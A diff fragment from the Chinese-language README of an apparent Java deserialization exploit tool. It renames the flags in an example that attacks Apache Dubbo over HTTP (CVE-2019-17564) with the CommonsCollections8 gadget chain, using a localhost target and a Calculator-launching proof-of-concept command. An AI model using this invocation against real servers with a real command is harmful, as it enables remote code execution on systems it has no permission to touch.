@@ -58,15 +58,15 @@ ldap://127.0.0.1:43658/Calc
 
 例（测试dubbo在使用http协议+java反序列化，dubbo < 2.7.5前使用http协议，后续改为了jsonrpc）CVE-2019-17564：
 ```
--t
+--target
 127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService
--protocol
+--protocol
 http
--s
+--serialization
 java
--p
+--gadget
 CommonsCollections8
--param
+--args
 /System/Applications/Calculator.app/Contents/MacOS/Calculator
 ```
 
